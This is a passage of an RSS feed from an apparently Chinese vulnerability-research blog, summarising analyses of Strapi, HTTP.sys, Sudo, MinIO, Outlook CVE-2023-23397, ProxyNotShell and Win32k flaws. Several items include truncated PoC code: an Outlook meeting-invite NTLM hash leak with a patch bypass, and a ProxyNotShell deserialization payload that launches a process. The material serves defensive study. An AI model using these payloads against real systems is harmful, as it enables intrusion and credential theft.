影响版本 Strapi ≤ 4.5.5 环境搭建 参考https://razinj.dev/how-to-run-strapi-4-in-a-docker-container-using-docker-compose/，使用npx create-strapi-app@4.5.5 app 命令启动strapi v4.5.5并且用docker起数据库。
docker-compose.yml:
version: &amp;#39;3&amp;#39; services: postgres: image: postgres restart: always volumes: - pgdata:/var/lib/postgresql/data environment: POSTGRES_USER: strapi POSTGRES_PASSWORD: strapi POSTGRES_DB: strapi ports: - &amp;#39;5432:5432&amp;#39; mysql: image: mysql:5 restart: always command: --default-authentication-plugin=mysql_native_password environment: MYSQL_DATABASE: strapi MYSQL_USER: strapi MYSQL_PASSWORD: strapi MYSQL_ROOT_HOST: &amp;#39;%&amp;#39; MYSQL_ROOT_PASSWORD: strapi volumes: - mysqldata:/var/lib/mysql ports: - &amp;#39;3306:3306&amp;#39; volumes: pgdata: mysqldata: 由于strapi监听在localhost，通过ssh把1337端口转发出来</description></item><item><title>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</link><pubDate>Fri, 05 May 2023 20:59:45 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</guid><description>基本信息 在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。
环境搭建 操作系统 windows 10 调试器 windbg 技术分析&amp;amp;调试 PoC
#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include &amp;lt;http.h&amp;gt; #include &amp;lt;sspi.h&amp;gt; #include &amp;lt;strsafe.h&amp;gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // 初始化HTTP服务器驱动 retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode !</description></item><item><title>CVE-2021-3156 Sudo 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/</link><pubDate>Fri, 05 May 2023 20:54:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/</guid><description>Created at 2023-05-05T20:54:20+08:00</description></item><item><title>CVE-2023-28432 MinIO 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</link><pubDate>Fri, 05 May 2023 20:53:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</guid><description>基本信息 Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。
指纹 web.title=&amp;ldquo;minio&amp;rdquo;
影响版本 2019-12-17t23-16-33z &amp;lt;= Minio &amp;lt; 2023-03-20t20-16-18z
环境搭建 使用Docker启动4个minio即可。
技术分析&amp;amp;调试 补丁分析 对比修复版本和未修复版本 https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&amp;hellip;RELEASE.2023-03-20T20-16-18Z可知漏洞在commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077修复，查看修复代码，可以知道在 cmd/bootstrap-peer-server.go#VerifyHandler方法中增加了鉴权逻辑： func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.</description></item><item><title>CVE-2023-23397 Outlook 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/</link><pubDate>Fri, 05 May 2023 20:50:19 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/</guid><description>基本信息 Microsoft Outlook 存在权限提升漏洞，未经身份验证的远程攻击者可通过向受害者发送特制的带有UNC地址的电子邮件来利用此漏洞，当受害者所用的outlook处于打开状态时，outlook收到的会议提醒过期时会尝试连接攻击者指定的外部 UNC 位置。这会将受害者的Net-NTLMv2 hash泄露给攻击者，然后攻击者可以将其中继到另一个服务，进而获得该用户权限。
在微软发布的补丁中对该漏洞修复不完全，只限制了所用UNC路径中不能含有”.”，攻击者可以使用诸如\aaa\形式的UNC路径对其绕过。
给Exchange邮箱发送带有ReminderFileParameter属性并指向UNC路径，ReminderOverride设为true，ReminderSet设为true即可触发
影响版本 略
环境搭建 outlook 2016 windows 2019 + AD域 技术分析&amp;amp;调试 根据微软文档，Outlook会议可以设置PidLidReminderFileParameter和PidLidReminderOverride属性，其含义分别为：指定客户在该对象的提醒过期时应播放的声音的文件名和Outlook客户端是否应该保留PidLidReminderFileParameter属性的值。攻击者在发送给受害者的会议里面设置PidLidReminderFileParameter和PidLidReminderOverride属性，当会议过期时outlook会尝试解析PidLidReminderFileParameter属性并尝试播放PidLidReminderFileParameter指向的路径的声音文件(.wav)，但outlook解析时并未限制PidLidReminderFileParameter属性指向的是本地文件还是网络文件。
即PidLidReminderFileParameter可以指向网络共享文件。攻击者将恶意会议邀请的PidLidReminderFileParameter属性设为攻击者控制的系统对应的UNC路径，并将PidLidReminderOverride属性设为true，将邀请发给受害者邮箱，当受害者在outlook上登录了邮箱时，outlook会自动获取该文件，当该路径参数为UNC路径时，outlook会以该用户身份向这个UNC路径对应的系统发起NTLM认证，尝试获取UNC路径指向的文件，此时攻击者可以获取到该认证hash，并将该hash中继到其他服务上，即可获取到受害者的权限。
该漏洞PoC先使用MsgKit库生成msg文件（outlook邮件格式），而后利用Aspose库读取msg文件并将其反序列化为MapiMessage对象，在其上添加ReminderSet并置为true，而后转换为MailMessage对象，通过smtpClient.Send发给受害者。从而触发漏洞，获取到受害者NTLM hash。 在微软2023年3月补丁日中对此漏洞进行了修复，但此漏洞修复不完全，只是限制了PidLidReminderFileParameter属性内不能含有”.”，导致攻击者可以使用\aaa\形式绕过此补丁。
PoC
using System; using Aspose.Email.Mapi; using Aspose.Email; using Aspose.Email.Clients.Smtp; namespace MsgKit { class Program { static void Main(string[] args) { string lanPath = @&amp;#34;\\server\test\&amp;#34;; string saveFilePath = @&amp;#34;saveFilePath&amp;#34;; using (var appoionment = new Appointment( new Sender(&amp;#34;winserver@domain.com&amp;#34;, &amp;#34;Sender&amp;#34;), new Representing(&amp;#34;winserver@domain.com&amp;#34;, &amp;#34;Sender&amp;#34;), &amp;#34;pish&amp;#34;)) { appoionment.Recipients.AddTo(&amp;#34;administrator@domain.com&amp;#34;, &amp;#34;administrator&amp;#34;); appoionment.Subject = &amp;#34;pish&amp;#34;; appoionment.</description></item><item><title>Proxy Not Shell 利用链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description>漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：
CVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。
CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。
在PoC中发送了以下三种类型的PSRP消息
0x00010002 SESSION_CAPABILITY
SESSION_CAPABILITY 应该是创建RunspacePool
0x00010004 INIT_RUNSPACEPOOL
INIT_RUNSPACEPOOL 应该是初始化RunspacePool
0x00021006 CREATE_PIPELINE
创建命令管道并在指定的 RunspacePool 中调用它
PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。
PoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象
&amp;lt;Obj N=&amp;#34;V&amp;#34; RefId=&amp;#34;14&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;System.ServiceProcess.ServiceController&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;S N=&amp;#34;Name&amp;#34;&amp;gt;Type&amp;lt;/S&amp;gt; &amp;lt;Obj N=&amp;#34;TargetTypeForDeserialization&amp;#34;&amp;gt; &amp;lt;TN RefId=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;T&amp;gt;System.Exception&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;MS&amp;gt; &amp;lt;BA N=&amp;#34;SerializationData&amp;#34;&amp;gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=&amp;lt;/BA&amp;gt; &amp;lt;/MS&amp;gt; &amp;lt;/Obj&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;S&amp;gt; &amp;lt;![CDATA[&amp;lt;ResourceDictionary xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34; xmlns:System=&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34; xmlns:Diag=&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider x:Key=&amp;#34;LaunchCalch&amp;#34; ObjectType=&amp;#34;{x:Type Diag:Process}&amp;#34; MethodName=&amp;#34;Start&amp;#34;&amp;gt;&amp;lt;ObjectDataProvider.</description></item><item><title>CVE-2021-40449 Win32k 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</guid><description>CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。
基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。
内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：
在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。
句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。
句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。
https://www.cnblogs.com/MisterXu/p/10846918.html
DC：是一个内核对象，全称device context，设备上下文对象
HDC：DC对象的句柄。
释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。
eg：
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-&amp;gt;p = method; p-&amp;gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i &amp;lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-&amp;gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(&amp;#34;第二次调用\n&amp;#34;); p-&amp;gt;p(); return 0; } void method() { printf(&amp;#34;method\n&amp;#34;); } void badMethod() { printf(&amp;#34;bad method\n&amp;#34;); } 漏洞形成分析 该漏洞产生于win32kfull!</description></item></channel></rss>